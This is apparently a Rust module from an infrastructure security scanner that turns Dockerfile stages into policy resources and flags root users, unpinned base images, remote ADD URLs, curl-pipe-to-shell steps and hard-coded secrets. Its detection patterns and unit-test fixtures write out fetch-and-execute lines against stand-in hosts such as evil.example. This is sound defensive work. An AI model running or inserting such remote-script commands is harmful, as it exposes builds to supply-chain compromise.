//! Dockerfile → normalized resource tree (spec 7.3, ADR 0007).
//!
//! A Dockerfile is not declarative like HCL/YAML: it is an ordered instruction
//! list with build stages. We fold each stage into one [`Resource`] of kind
//! `dockerfile_stage`, exposing normalized boolean facts as attributes so the
//! same data-driven policy engine evaluates it — no Docker-specific code in
//! the evaluator. Semantics that need instruction ordering (the *effective*
//! final `USER`, whether a stage is the final one) are computed here.

use std::collections::BTreeMap;

use crate::resource::{Resource, Value};

/// Defensive cap: a pathological Dockerfile cannot allocate unbounded stages.
const MAX_STAGES: usize = 10_000;

/// Whether a file name is a Dockerfile (or Podman Containerfile). Matches
/// `Dockerfile`, `Dockerfile.prod`, `api.Dockerfile`, and `Containerfile`.
/// A `Dockerfile.<ext>` whose extension is a known doc/data type (e.g.
/// `Dockerfile.md`) is not treated as one — it is documentation, not a build.
pub fn is_dockerfile(file_name: &str) -> bool {
    let lower = file_name.to_ascii_lowercase();
    if lower == "dockerfile" || lower == "containerfile" || lower.ends_with(".dockerfile") {
        return true;
    }
    if let Some(suffix) = lower.strip_prefix("dockerfile.") {
        const NON_DOCKER: &[&str] =
            &["md", "txt", "rst", "yml", "yaml", "json", "html", "adoc"];
        return !NON_DOCKER.contains(&suffix);
    }
    false
}

/// One build stage while accumulating instructions.
struct Stage {
    /// Base image reference after `FROM` (lowercased image, original tag).
    base_image: String,
    base_tag: Option<String>,
    base_digest_pinned: bool,
    /// `FROM <prev-stage>`: base is another stage, not a registry image.
    from_stage_ref: bool,
    /// Last `USER` seen in the stage (`None` ⇒ inherits root by default).
    user: Option<String>,
    adds_remote_url: bool,
    curl_pipe_shell: bool,
    secret_in_env: bool,
}

/// Join `\`-continued physical lines into logical instructions, dropping
/// comments and blank lines. Comment lines (after optional whitespace) and
/// trailing inline continuations are handled; parser directives are comments.
fn logical_lines(text: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut current = String::new();
    for raw in text.lines() {
        let line = raw.trim_end_matches(['\r']);
        let trimmed = line.trim_start();
        // A comment only when the *continuation* is not in progress.
        if current.is_empty() && (trimmed.is_empty() || trimmed.starts_with('#')) {
            continue;
        }
        let body = line.trim_end();
        if let Some(stripped) = body.strip_suffix('\\') {
            current.push_str(stripped);
            current.push(' ');
        } else {
            current.push_str(body);
            out.push(std::mem::take(&mut current));
        }
    }
    if !current.trim().is_empty() {
        out.push(current);
    }
    out
}

/// A value looks like a literal secret: a real assignment, not a build-arg
/// reference (`$FOO`) or an empty placeholder.
fn is_literal_secret_value(value: &str) -> bool {
    let v = value.trim().trim_matches(['"', '\'']);
    !v.is_empty() && !v.starts_with('$')
}

/// Whether an env/arg key name reads as a secret.
fn is_secret_key(key: &str) -> bool {
    let k = key.to_ascii_lowercase();
    ["password", "passwd", "secret", "api_key", "apikey", "token", "access_key", "private_key"]
        .iter()
        .any(|needle| k.contains(needle))
}

/// A `RUN` body that pipes a network fetch straight into a shell.
fn is_curl_pipe_shell(body: &str) -> bool {
    let lower = body.to_ascii_lowercase();
    let fetches = lower.contains("curl ") || lower.contains("wget ");
    let piped_to_shell = ["| sh", "|sh", "| bash", "|bash", "| sudo", "|sudo"]
        .iter()
        .any(|p| lower.contains(p));
    fetches && piped_to_shell
}

/// Parse `FROM` arguments: `image[:tag][@digest] [AS name]`.
fn parse_from(args: &str, stage_names: &[String]) -> Stage {
    let mut parts = args.split_whitespace();
    let image_ref = parts.next().unwrap_or("").to_string();
    let image_lower = image_ref.to_ascii_lowercase();

    // `FROM builder` where `builder` is an earlier stage.
    let from_stage_ref = stage_names.iter().any(|s| s == &image_lower);

    let (without_digest, digest) = match image_lower.split_once('@') {
        Some((img, dig)) => (img.to_string(), Some(dig)),
        None => (image_lower.clone(), None),
    };
    let (image, tag) = match without_digest.rsplit_once(':') {
        // A `:` after the last `/` is a tag, not a registry port.
        Some((img, tag)) if !tag.contains('/') => (img.to_string(), Some(tag.to_string())),
        _ => (without_digest.clone(), None),
    };

    Stage {
        base_image: image,
        base_tag: tag,
        base_digest_pinned: digest.is_some(),
        from_stage_ref,
        user: None,
        adds_remote_url: false,
        curl_pipe_shell: false,
        secret_in_env: false,
    }
}

/// Parse a Dockerfile into one resource per stage.
pub fn parse(text: &str, source_path: &str) -> Result<Vec<Resource>, String> {
    let mut stages: Vec<Stage> = Vec::new();
    let mut stage_names: Vec<String> = Vec::new();

    for line in logical_lines(text) {
        let mut it = line.splitn(2, char::is_whitespace);
        let instruction = it.next().unwrap_or("").to_ascii_uppercase();
        let args = it.next().unwrap_or("").trim();

        match instruction.as_str() {
            "FROM" => {
                if stages.len() >= MAX_STAGES {
                    break;
                }
                let stage = parse_from(args, &stage_names);
                // Record the `AS <name>` alias so later `FROM <name>` resolves.
                let lower = args.to_ascii_lowercase();
                if let Some(idx) = lower.find(" as ") {
                    let alias = lower[idx + 4..].split_whitespace().next().unwrap_or("");
                    if !alias.is_empty() {
                        stage_names.push(alias.to_string());
                    }
                }
                stages.push(stage);
            }
            _ => {
                let Some(stage) = stages.last_mut() else {
                    continue; // instruction before any FROM — ignore
                };
                match instruction.as_str() {
                    "USER" => {
                        stage.user =
                            args.split(':').next().map(|u| u.trim().to_ascii_lowercase());
                    }
                    "ADD" => {
                        if args.split_whitespace().any(|tok| {
                            tok.starts_with("http://") || tok.starts_with("https://")
                        }) {
                            stage.adds_remote_url = true;
                        }
                    }
                    "RUN" => {
                        if is_curl_pipe_shell(args) {
                            stage.curl_pipe_shell = true;
                        }
                    }
                    "ENV" | "ARG" => {
                        // `ENV k=v k2=v2` or `ENV k v`.
                        if let Some((key, value)) = args.split_once('=') {
                            if is_secret_key(key.trim()) && is_literal_secret_value(value) {
                                stage.secret_in_env = true;
                            }
                        } else if let Some((key, value)) = args.split_once(char::is_whitespace) {
                            if is_secret_key(key.trim()) && is_literal_secret_value(value) {
                                stage.secret_in_env = true;
                            }
                        }
                    }
                    _ => {}
                }
            }
        }
    }

    if stages.is_empty() {
        return Ok(vec![]);
    }

    let last = stages.len() - 1;
    let resources = stages
        .into_iter()
        .enumerate()
        .map(|(idx, stage)| {
            let is_final = idx == last;
            // Effective user is root when no USER is set, or it is root/0.
            let user_root = matches!(stage.user.as_deref(), None | Some("root") | Some("0"));
            // A floating base tag: `latest`, or untagged, on a real registry
            // image (not a stage ref, not `scratch`, not digest-pinned).
            let floating = !stage.from_stage_ref
                && !stage.base_digest_pinned
                && stage.base_image != "scratch"
                && matches!(stage.base_tag.as_deref(), None | Some("latest"));

            let mut attrs: BTreeMap<String, Value> = BTreeMap::new();
            attrs.insert("is_final_stage".into(), Value::Bool(is_final));
            attrs.insert("effective_user_root".into(), Value::Bool(user_root));
            attrs.insert("adds_remote_url".into(), Value::Bool(stage.adds_remote_url));
            attrs.insert("curl_pipe_shell".into(), Value::Bool(stage.curl_pipe_shell));
            attrs.insert("secret_in_env".into(), Value::Bool(stage.secret_in_env));
            attrs.insert("base_image_floating".into(), Value::Bool(floating));
            attrs.insert("base_image".into(), Value::String(stage.base_image.clone()));

            Resource {
                kind: "dockerfile_stage".to_string(),
                name: format!("stage{idx}"),
                address: format!("dockerfile.stage{idx}"),
                attributes: attrs,
                source_path: source_path.to_string(),
            }
        })
        .collect();
    Ok(resources)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn attrs(text: &str) -> Vec<Resource> {
        parse(text, "Dockerfile").unwrap()
    }
    fn flag(r: &Resource, key: &str) -> bool {
        matches!(r.attributes.get(key), Some(Value::Bool(true)))
    }

    #[test]
    fn recognizes_dockerfile_names() {
        for n in ["Dockerfile", "dockerfile", "Dockerfile.prod", "api.Dockerfile", "Containerfile"] {
            assert!(is_dockerfile(n), "{n}");
        }
        for n in ["Dockerfile.md", "readme.txt", "docker-compose.yaml"] {
            assert!(!is_dockerfile(n), "{n}");
        }
    }

    #[test]
    fn root_user_and_floating_tag() {
        let r = attrs("FROM ubuntu:latest\nRUN echo hi\n");
        assert_eq!(r.len(), 1);
        assert!(flag(&r[0], "is_final_stage"));
        assert!(flag(&r[0], "effective_user_root"), "no USER ⇒ root");
        assert!(flag(&r[0], "base_image_floating"), "latest tag floats");
    }

    #[test]
    fn explicit_nonroot_user_and_pinned_tag() {
        let r = attrs("FROM node:20.1.0\nUSER node\n");
        assert!(!flag(&r[0], "effective_user_root"));
        assert!(!flag(&r[0], "base_image_floating"));
    }

    #[test]
    fn digest_pinned_is_not_floating() {
        let r = attrs("FROM ubuntu@sha256:abcdef\n");
        assert!(!flag(&r[0], "base_image_floating"));
    }

    #[test]
    fn add_remote_and_curl_pipe_shell() {
        let r = attrs(
            "FROM alpine:3.19\nADD https://evil.example/x.sh /x.sh\nRUN curl -fsSL https://get.example | bash\n",
        );
        assert!(flag(&r[0], "adds_remote_url"));
        assert!(flag(&r[0], "curl_pipe_shell"));
    }

    #[test]
    fn line_continuation_and_comments() {
        let r = attrs(
            "# base\nFROM alpine:3.19\nRUN curl -fsSL https://get.example \\\n  | sh\n",
        );
        assert!(flag(&r[0], "curl_pipe_shell"), "continuation must join");
    }

    #[test]
    fn secret_in_env_literal_only() {
        let r = attrs("FROM alpine:3.19\nENV API_KEY=sk-abc123 PATH=/usr/bin\n");
        assert!(flag(&r[0], "secret_in_env"));
        // A build-arg reference is not a literal leak.
        let r2 = attrs("FROM alpine:3.19\nARG TOKEN\nENV TOKEN=$TOKEN\n");
        assert!(!flag(&r2[0], "secret_in_env"));
    }

    #[test]
    fn multistage_only_final_user_matters() {
        // Builder runs as root; final stage drops to a user and pins its tag.
        let r = attrs(
            "FROM golang:1.22 AS build\nRUN make\nFROM gcr.io/distroless/base:nonroot\nUSER 65532\nCOPY --from=build /app /app\n",
        );
        assert_eq!(r.len(), 2);
        assert!(flag(&r[0], "effective_user_root"));
        assert!(!flag(&r[0], "is_final_stage"));
        assert!(!flag(&r[1], "effective_user_root"), "final stage is non-root");
        assert!(flag(&r[1], "is_final_stage"));
        assert!(!flag(&r[1], "base_image_floating"), "tagged base does not float");
    }

    #[test]
    fn from_prior_stage_is_not_a_floating_image() {
        // The final image is a previous stage by name: not a registry pull.
        let r = attrs("FROM alpine:3.19 AS base\nFROM base\nUSER app\n");
        assert!(!flag(&r[1], "base_image_floating"), "stage ref must not float");
    }

    #[test]
    fn registry_port_is_not_a_tag() {
        let r = attrs("FROM registry.internal:5000/app\n");
        // No tag ⇒ floats, but the image is not truncated at the port colon.
        assert_eq!(
            r[0].attributes.get("base_image").and_then(Value::as_str),
            Some("registry.internal:5000/app")
        );
    }
}
